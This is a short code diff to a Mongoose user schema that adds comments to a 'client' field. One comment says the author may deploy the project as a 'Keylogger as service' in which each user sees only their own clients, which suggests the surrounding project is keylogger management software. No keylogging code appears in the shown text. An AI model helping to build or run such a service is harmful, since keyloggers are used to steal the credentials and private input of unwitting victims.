@@ -25,7 +25,8 @@ const UserSchema = new Schema({
     required: false,
     full: false,
   }],
-  client: [{
+  // This is for future if I want to deploy it as Keylogger as service kinda shit then each person should see his client's only!
+  client: [{ // Dont think I should use this
     type: Schema.Types.ObjectId,
     ref: 'ClientProfile',
   }],
